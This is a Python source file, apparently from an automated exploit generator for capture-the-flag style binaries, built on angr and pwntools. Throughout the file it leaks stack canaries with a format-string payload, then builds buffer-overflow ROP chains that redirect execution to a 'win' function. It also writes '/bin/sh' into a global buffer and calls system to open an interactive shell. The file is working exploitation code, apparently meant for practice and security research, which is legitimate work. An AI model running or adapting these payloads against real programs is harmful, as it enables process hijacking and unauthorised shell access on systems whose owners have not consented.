import angr
import os.path
from dataclasses import dataclass
from goals import Goal, SystemFunction, WinFunction
from pwn import p64, process, ROP, context
from vulns import (
    Vulnerability,
    StackBufferOverflow,
    WinFunctionCall,
    UnconstrainedPrintf,
    BufferWrite,
)
from binary import Binary
from typing import Optional
from constants import PROCESS_STDOUT_WAIT_TIMEOUT


@dataclass
class ExploitError(Exception):
    message: str


def exploit(binary: Binary, goals: list[Goal], vulns: list[Vulnerability]) -> bytes:
    if binary.pie:
        raise ExploitError("Cannot exploit binaries with PIE yet")

    canary_payloads = None
    if binary.canary:
        canary_payloads = gen_canary_leak_payload(binary, vulns)
        if len(canary_payloads) == 0:
            raise ExploitError("Failed to defect stack canary")

    for goal in goals:
        print(f"Current goal: {goal}")
        try:
            with context.quiet:
                p = process(
                    os.path.abspath(binary.path), cwd=os.path.dirname(binary.path)
                )

                # Leak stack canary if present
                canary = None
                if binary.canary:
                    p.send(canary_payloads[0])

                    # recvall with a timeout but it doesn't force close the connection
                    with p.local(PROCESS_STDOUT_WAIT_TIMEOUT):
                        try:
                            while True:
                                if not p._fillbuffer():
                                    break
                        except EOFError:
                            pass
                    out = p.buffer.get()

                    # Extract canary.
                    canary = int(out.split(b"0x")[-1].split(b"\n")[0].strip()[:16], 16)
                    print(f"canary = 0x{canary:x}")

                # Compute final payload stage
                payload, style = gen_payload(binary, goal, vulns, canary)
                p.sendline(payload)

                if style == "print_flag":
                    out = p.recvall()
                    p.close()

                    print(out)

                    if b"flag" in out:
                        return out
                elif style == "shell":
                    p.interactive()
                    p.close()
                    return None
                else:
                    print(f"Unknown exploit style '{style}'")
                    p.interactive()
                    p.close()
            print("Exploit didn't print flag. Trying next goal.\n")
        except ExploitError as e:
            raise ExploitError(f"Failed to achieve goal: {e}")

    raise ExploitError("No solvable goals")


def gen_canary_leak_payload(binary: Binary, vulns: list[Vulnerability]) -> list[bytes]:
    res = []
    for vuln in vulns:
        if not isinstance(vuln, UnconstrainedPrintf):
            continue
        res.append(gen_printf_payload(binary, vuln))
    return res


def gen_printf_payload(binary: Binary, vuln: UnconstrainedPrintf) -> bytes:
    rdi = vuln.state.regs.rdi
    format_string = b"%39$p\x00"
    constraint = format_string == vuln.state.memory.load(rdi, len(format_string))
    if not vuln.state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    vuln.state.solver.add(constraint)
    payload = get_satisfying_input(vuln.state)
    return payload


def gen_payload(
    binary: Binary, goal: Goal, vulns: list[Vulnerability], canary: Optional[int]
) -> tuple[bytes, str]:
    if isinstance(goal, WinFunction):
        return (gen_win_function_payload(binary, goal, vulns, canary), "print_flag")
    if isinstance(goal, SystemFunction):
        return (gen_system_function_payload(binary, goal, vulns), "shell")

    raise ExploitError(f"Cannot generate payload for {goal}")


def gen_win_function_payload(
    binary: Binary, goal: WinFunction, vulns: list[Vulnerability], canary: Optional[int]
) -> bytes:
    for vuln in vulns:
        if isinstance(vuln, StackBufferOverflow):
            return gen_stack_buffer_overflow_payload(binary, vuln, goal, canary)
        elif isinstance(vuln, WinFunctionCall):
            return get_satisfying_input(vuln.state)

    raise ExploitError(
        "Payload generation requires a StackBufferOverflow or WinFunctionCall vulnerability"
    )


def gen_stack_buffer_overflow_payload(
    binary: Binary, vuln: StackBufferOverflow, goal: WinFunction, canary: Optional[int]
) -> bytes:
    rop = ROP(binary.elf)
    gadget = rop.find_gadget(["ret"])
    input = vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )
    payload = input
    if binary.canary:
        payload += (
            b"A" * (vuln.saved_rip_offset - 16)
            + p64(canary)
            + b"B" * 8
            + p64(gadget.address)
            + p64(goal.addr)
        )
    else:
        payload += b"A" * vuln.saved_rip_offset + p64(gadget.address) + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload


def get_satisfying_input(state: angr.SimState) -> bytes:
    # Angr leaves off newlines for some reason (I think...)
    return (
        state.solver.eval(
            state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
        )
        + b"\n"
    )


def gen_win_function_call_payload(
    binary: Binary, vuln: WinFunctionCall, goal: Goal
) -> bytes:
    return vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )


def gen_system_function_payload(
    binary: Binary, goal: SystemFunction, vulns: list[Vulnerability]
) -> bytes:
    buffer_write: BufferWrite | None = next(
        (
            vuln
            for vuln in vulns
            if isinstance(vuln, BufferWrite) and vuln.buffer_type == "Global"
        ),
        None,
    )
    if buffer_write is None:
        raise ExploitError("No global buffer to write to")
    if buffer_write.buffer_len is not None and buffer_write.buffer_len < 8:
        raise ExploitError("Buffer too small")

    options = angr.options.unicorn
    options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
    base_state = binary.angr.factory.entry_state(
        add_options=options, stdin=angr.SimFile
    )
    simgr = binary.angr.factory.simulation_manager(base_state)
    simgr.explore(find=buffer_write.instruction_addr)

    write_bin_sh_state = simgr.found[0]
    for vuln in vulns:
        if not isinstance(vuln, StackBufferOverflow):
            continue
        simgr = binary.angr.factory.simulation_manager(write_bin_sh_state.copy())
        simgr.explore(find=buffer_write.instruction_addr)
        for state in simgr.found:
            input = state.solver.eval(
                state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
            )
            if len(input) > 0:
                input += b"\n"

            rop = ROP(binary.elf)

            ret = rop.find_gadget(["ret"]).address
            rop.raw(ret)

            rop.call(goal.addr, [buffer_write.buffer_addr])

            return b"/bin/sh\n" + input + b"A" * vuln.saved_rip_offset + rop.chain()

    raise ExploitError(f"Cannot generate payload for {goal}")
